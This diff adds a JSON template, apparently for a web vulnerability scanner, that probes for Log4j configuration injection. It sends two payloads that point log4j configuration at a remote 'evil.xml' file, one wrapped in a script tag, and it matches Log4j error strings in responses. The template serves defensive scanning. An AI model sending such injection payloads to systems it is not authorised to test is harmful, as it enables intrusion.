@@ -1,0 +1,33 @@
+{
+    "id": "log4j",
+    "severity": "high",
+    "request": {
+        "method": "GET",
+        "payloads": true,
+        "headers": {
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Encoding": "gzip, deflate",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Connection": "keep-alive",
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2"
+        }
+    },
+    "stopAtMatch": true,
+    "matchers-condition": "or",
+    "matches": [
+        {
+            "type": "regex",
+            "part": "body",
+            "regex": "java.lang.reflect.InvocationTargetException"
+        },
+        {
+            "type": "exact",
+            "part": "body",
+            "string": "log4j:ERROR"
+        }
+    ],
+    "payloads": [
+        "{log4j.configuration=http://localhost:8080/evil.xml}",
+        "<script>log4j.appender.A1.File=http://localhost:8080/evil.xml</script>"
+    ]
+}
